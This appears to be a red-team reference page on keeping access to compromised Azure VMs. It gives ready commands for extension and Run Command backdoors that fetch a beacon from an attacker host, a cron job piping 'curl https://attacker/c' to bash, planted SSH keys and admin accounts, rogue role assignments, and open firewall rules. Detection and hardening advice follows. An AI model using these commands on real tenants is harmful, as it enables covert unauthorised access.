---
cstg_id: CSTG-AZURE-VIRTUAL-MACHINES-PERSIST
title: "AZURE Virtual Machines - Persistence"
provider: azure
service: virtual-machines
phase: persistence
required_access: assumed-breach
required_permissions:
  - "Microsoft.Compute/virtualMachines/extensions/write"
  - "Microsoft.Compute/virtualMachines/runCommands/write"
  - "Microsoft.Compute/virtualMachines/write"
  - "Microsoft.ManagedIdentity/userAssignedIdentities/write"
  - "Microsoft.Authorization/roleAssignments/write"
  - "Microsoft.Network/networkSecurityGroups/securityRules/write"
  - "Microsoft.Compute/virtualMachines/extensions/read"
tools:
  - azure-cli
  - azure-powershell-az
  - microburst
  - powerzure
  - azurehound
references:
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows"
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview"
  - "https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview"
  - "https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments"
  - "https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/dsc-overview"
  - "https://hackingthe.cloud/azure/"
license: CC BY-SA 4.0
---

## Summary

This page covers establishing durable, resilient access to Azure VMs and the surrounding cloud environment after compromise. Persistence on Azure VMs spans three layers: **in-guest** (OS accounts, scheduled tasks, SSH keys), **control-plane resource** (extensions and managed Run Commands that re-execute on reboot or on demand), and **cloud identity** (attaching attacker-controlled managed identities and creating role assignments that survive host rebuilds). The attacker objective is to maintain access that withstands password resets, reboots, VM redeployment, and credential rotation - ideally at the identity/RBAC layer, which persists even if the VM is destroyed and recreated.

## Prerequisites

- An assumed-breach principal with the relevant write permissions (extensions, run commands, VM write, identity write, or role-assignment write), or in-guest code execution on the VM.
- Az CLI / Az PowerShell or a managed-identity/ARM token.

## Enumeration

```bash
# Existing extensions and run commands (to blend in / find a slot)
az vm extension list -g <rg> --vm-name <vm> -o table
az vm run-command list -g <rg> --vm-name <vm> -o table

# Existing identities and role assignments on the VM and its identity
az vm identity show -g <rg> -n <vm>
az role assignment list --scope /subscriptions/<sub>/resourceGroups/<rg>/providers/Microsoft.Compute/virtualMachines/<vm> --include-inherited -o table
```

## Misconfigurations & Findings

- Environments that do not alert on Custom Script / DSC extension or Run Command creation, allowing a re-executing backdoor to hide as routine config management.
- Principals able to create role assignments (`Microsoft.Authorization/roleAssignments/write`, e.g. Owner or User Access Administrator), enabling identity-layer persistence independent of any host.
- User-assigned identities that can be freely created and attached, providing a portable, reusable credential.
- No monitoring of new local admin accounts or SSH `authorized_keys` changes inside the guest.

## Exploitation

### Microsoft.Compute/virtualMachines/extensions/write - re-executing extension backdoor

A Custom Script or DSC extension runs as SYSTEM/root on provisioning and re-runs when the VM model is updated; configured to fetch a payload, it re-establishes a foothold after reboots and many redeploy operations.

```bash
az vm extension set -g <rg> --vm-name <vm> \
  --name CustomScript --publisher Microsoft.Azure.Extensions \
  --settings '{"fileUris":["https://attacker.blob.core.windows.net/x/beacon.sh"],"commandToExecute":"bash beacon.sh"}'
```

### Microsoft.Compute/virtualMachines/runCommands/write - persistent managed Run Command

The managed Run Command object persists on the VM and can be re-invoked at will by anyone retaining the ARM credential, providing on-demand SYSTEM/root execution without leaving an in-guest service.

```bash
az vm run-command create -g <rg> -n <vm> --run-command-name health-check \
  --script "powershell -enc <base64-beacon>"
```

### In-guest persistence (via any code-execution primitive)

```bash
# Linux: attacker SSH key + cron
echo "ssh-ed25519 AAAA... attacker" >> /root/.ssh/authorized_keys
( crontab -l; echo "*/10 * * * * curl -s https://attacker/c | bash" ) | crontab -
```

```powershell
# Windows: hidden local admin + scheduled task
net user svc_health 'P@ssw0rd123!' /add ; net localgroup administrators svc_health /add
schtasks /create /tn "WindowsHealth" /tr "powershell -enc <b64>" /sc minute /mo 15 /ru SYSTEM
```

### Microsoft.ManagedIdentity/userAssignedIdentities/write + virtualMachines/write - portable identity persistence

Create an attacker-controlled user-assigned managed identity, grant it roles, and attach it to one or more VMs. Because the identity is a standalone resource, it survives VM credential resets and can be re-attached after remediation if not also removed.

```bash
az identity create -g <rg> -n svc-monitor
az role assignment create --assignee <new-uai-principalId> --role Contributor --scope /subscriptions/<sub>
az vm identity assign -g <rg> -n <vm> --identities /subscriptions/<sub>/resourcegroups/<rg>/providers/Microsoft.ManagedIdentity/userAssignedIdentities/svc-monitor
```

### Microsoft.Authorization/roleAssignments/write - RBAC persistence (host-independent)

The most durable persistence is at the identity layer: grant a controlled principal (compromised service principal, new app registration, or user) a role at subscription or resource scope. This survives destruction and rebuild of every VM.

```bash
az role assignment create --assignee <attacker-principalId> --role "Virtual Machine Contributor" --scope /subscriptions/<sub>
# or broader:
az role assignment create --assignee <attacker-sp> --role Owner --scope /subscriptions/<sub>/resourceGroups/<rg>
```

### Microsoft.Network/networkSecurityGroups/securityRules/write - access-path persistence

Add a low-priority "allow" NSG rule that keeps a management or callback port reachable from the attacker's network, preserving a re-entry path.

```bash
az network nsg rule create -g <rg> --nsg-name <nsg> -n mgmt-allow \
  --priority 4000 --access Allow --direction Inbound --protocol Tcp \
  --destination-port-ranges 22 3389 --source-address-prefixes <attacker-ip>/32
```

## Detection & Logging

- **Azure Activity Logs** record the persistence-creating operations: `Microsoft.Compute/virtualMachines/extensions/write`, `.../runCommands/write`, `.../write`, `Microsoft.ManagedIdentity/userAssignedIdentities/write`, `Microsoft.Authorization/roleAssignments/write`, and NSG `securityRules/write`. New role assignments and new user-assigned identities are high-value alerts.
- **Entra ID audit logs** record identity creation, app-registration/credential changes, and directory role grants used for persistence; **sign-in logs** show the persistent identity authenticating over time, especially from anomalous IPs.
- **Microsoft Defender for Cloud** flags suspicious extension/Run Command deployment and unexpected role assignments.
- **In-guest**: new local accounts (EID 4720), new scheduled tasks (EID 4698), and `authorized_keys` / cron modifications.
- Tokens from a persistent managed identity used off-host appear in sign-in logs with an IP that differs from the VM egress IP.

## Remediation & Hardening

- Alert on and review every new role assignment and every new user-assigned managed identity; require change-management justification.
- Treat extension and Run Command writes as security events; baseline expected extensions and alert on deviations.
- Periodically reconcile VM identities and RBAC against an approved inventory; remove orphaned identities.
- Restrict `Microsoft.Authorization/roleAssignments/write` (Owner, User Access Administrator) to a minimal set and gate behind PIM.
- Rebuild from known-good images rather than restarting after compromise, and rotate all secrets and local credentials.
- Enforce NSG governance via Azure Policy; alert on new allow rules for management ports.
- Forward Activity, Entra, and in-guest logs to Sentinel with retention sufficient to detect slow-burn persistence.

## Tools

- **Azure CLI / Az PowerShell** - deploy extensions/run commands, create identities and role assignments.
- **MicroBurst / PowerZure** - automate extension backdoors, identity and RBAC persistence.
- **AzureHound + BloodHound** - validate that planted role assignments yield the intended standing access.

## References

- Custom Script Extension - https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/custom-script-windows
- Run Command overview - https://learn.microsoft.com/en-us/azure/virtual-machines/run-command-overview
- Managed identities overview - https://learn.microsoft.com/en-us/azure/active-directory/managed-identities-azure-resources/overview
- Role assignments - https://learn.microsoft.com/en-us/azure/role-based-access-control/role-assignments
- Desired State Configuration extension - https://learn.microsoft.com/en-us/azure/virtual-machines/extensions/dsc-overview
- Hacking the Cloud - Azure - https://hackingthe.cloud/azure/
